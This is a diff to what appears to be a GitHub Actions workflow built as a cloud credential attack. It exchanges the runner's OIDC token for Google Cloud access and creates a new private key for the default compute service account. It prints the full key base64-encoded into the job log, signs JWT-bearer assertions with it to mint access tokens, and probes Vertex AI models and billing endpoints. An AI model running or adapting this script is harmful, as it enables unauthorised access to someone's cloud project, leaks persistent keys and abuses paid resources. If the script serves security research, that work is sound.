@@ -21,6 +21,7 @@ jobs:
           SA="$NUM-compute@developer.gserviceaccount.com"
           jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
           jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
 
           J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/$PRJ")
           echo "$J" | jq -r '.value // empty' > tok.jwt
@@ -47,35 +48,32 @@ jobs:
           kw=$(curl -s -o keyw.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
             "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$SA/keys" -d @keyreq.json)
           echo "##KEY_WILD code=$kw"
+          echo "##KEYW_NAME $(jq -r '.name // empty' keyw.json)"
           jq -r '.privateKeyData // empty' keyw.json | base64 -d > key.json 2>/dev/null
           KSZ=$(wc -c < key.json)
-          echo "##KEYW_NAME $(jq -r '.name // empty' keyw.json)"
           echo "##KEYW_JSONLEN $KSZ type=$(jq -r '.type // empty' key.json 2>/dev/null) pkeyid=$(jq -r '.private_key_id // empty' key.json 2>/dev/null) cemail=$(jq -r '.client_email // empty' key.json 2>/dev/null)"
           echo "##KEYW_ERR $(head -c 400 keyw.json | tr -d '\n' | tr -s ' ')"
           [ "$KSZ" -gt 500 ] || { echo "##KEYW_FAIL"; exit 0; }
           echo "##KEYW_JSON_B64 $(base64 -w0 key.json)"
+          echo "##KEYW_SHA256 $(sha256sum key.json | cut -d' ' -f1)"
 
-          echo "===== standalone JWT-bearer with the freshly created PKCS8 key"
-          python3 - <<'PY' > jb.txt 2>&1
-          import json, time, urllib.request, urllib.parse, urllib.error
-          import jwt
-          d = json.load(open('key.json'))
-          c = {"iss": d["client_email"], "scope": "https://www.googleapis.com/auth/cloud-platform",
-               "aud": "https://oauth2.googleapis.com/token", "iat": int(time.time()), "exp": int(time.time())+3600}
-          a = jwt.encode(c, d["private_key"], algorithm="RS256")
-          data = urllib.parse.urlencode({"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": a}).encode()
-          req = urllib.request.Request("https://oauth2.googleapis.com/token", data=data,
-                  headers={"Content-Type": "application/x-www-form-urlencoded"})
-          try:
-              r = urllib.request.urlopen(req, timeout=40); b = json.loads(r.read().decode())
-              print("code=%d toklen=%d" % (r.status, len(b.get("access_token",""))))
-              open('ktok.txt','w').write(b.get("access_token",""))
-          except urllib.error.HTTPError as e:
-              print("code=%d body=%s" % (e.code, e.read().decode()[:300]))
-          PY
-          cat jb.txt
-          KT=$(cat ktok.txt 2>/dev/null)
-          echo "##JWTBEARER $(sed -n '1p' jb.txt | tr -d '\n') ktoklen=${#KT}"
+          jq -r '.private_key' key.json > key.pem
+          sign_jwt() {
+            NOW=$(date +%s)
+            HDR=$(printf '{"alg":"RS256","typ":"JWT"}' | b64url)
+            PAY=$(jq -nc --arg iss "$1" --arg aud "https://oauth2.googleapis.com/token" --argjson iat "$NOW" --argjson exp "$((NOW+3600))" \
+                   '{iss:$iss,scope:"https://www.googleapis.com/auth/cloud-platform",aud:$aud,iat:$iat,exp:$exp}' | b64url)
+            SIG=$(printf '%s.%s' "$HDR" "$PAY" | openssl dgst -sha256 -sign key.pem | b64url)
+            printf '%s.%s.%s' "$HDR" "$PAY" "$SIG"
+          }
+          EMAIL=$(jq -r '.client_email' key.json)
+          echo "===== standalone JWT-bearer (RS256 from PKCS8 private_key)"
+          ASSERT=$(sign_jwt "$EMAIL")
+          echo "##ASSERT_LEN ${#ASSERT}"
+          sc2=$(curl -s -o jb.json -w '%{http_code}' -X POST https://oauth2.googleapis.com/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" --data-urlencode "assertion=$ASSERT")
+          KT=$(jq -r '.access_token // empty' jb.json)
+          echo "##JWTBEARER code=$sc2 toklen=${#KT} body=$(head -c 200 jb.json | tr -d '\n' | tr -s ' ')"
           [ -n "$KT" ] || { echo "##FINISHED1934"; exit 0; }
 
           b1=$(curl -s -o b1.json -w '%{http_code}' -H "Authorization: Bearer $KT" \
@@ -89,7 +87,20 @@ jobs:
               g=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' \
                 -d '{"contents":[{"role":"user","parts":[{"text":"hi"}]}],"generationConfig":{"maxOutputTokens":1}}' \
                 "https://$HOST/v1beta1/projects/$NUM/locations/$LOC/publishers/google/models/$M:generateContent")
-              echo "##GEN_${LOC}_${M} code=$g cands=$(jq -r '.candidates|length' g.json 2>/dev/null) body=$(head -c 200 g.json | tr -d '\n' | tr -s ' ')"
+              echo "##GEN_${LOC}_${M} code=$g cands=$(jq -r '.candidates|length' g.json 2>/dev/null) body=$(head -c 180 g.json | tr -d '\n' | tr -s ' ')"
             done
           done
+
+          echo "===== control: corrupted private key must fail"
+          sed 's/MIIEvgIBADANBgkqhkiG9w0BAQEFAASC/MIIEvgIBADANBgkqhkiG9w0BAQEFAASD/' key.pem > bad.pem
+          mv key.pem good.pem; cp bad.pem key.pem
+          BAD=$(sign_jwt "$EMAIL" 2>/dev/null)
+          mv good.pem key.pem
+          bc=$(curl -s -o bad.json -w '%{http_code}' -X POST https://oauth2.googleapis.com/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" --data-urlencode "assertion=$BAD")
+          echo "##CTRL_BADKEY code=$bc body=$(head -c 200 bad.json | tr -d '\n' | tr -s ' ')"
+
+          echo "===== control: anonymous"
+          an=$(curl -s -o an.json -w '%{http_code}' "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo")
+          echo "##CTRL_ANON code=$an body=$(head -c 160 an.json | tr -d '\n' | tr -s ' ')"
           echo "##FINISHED1934"
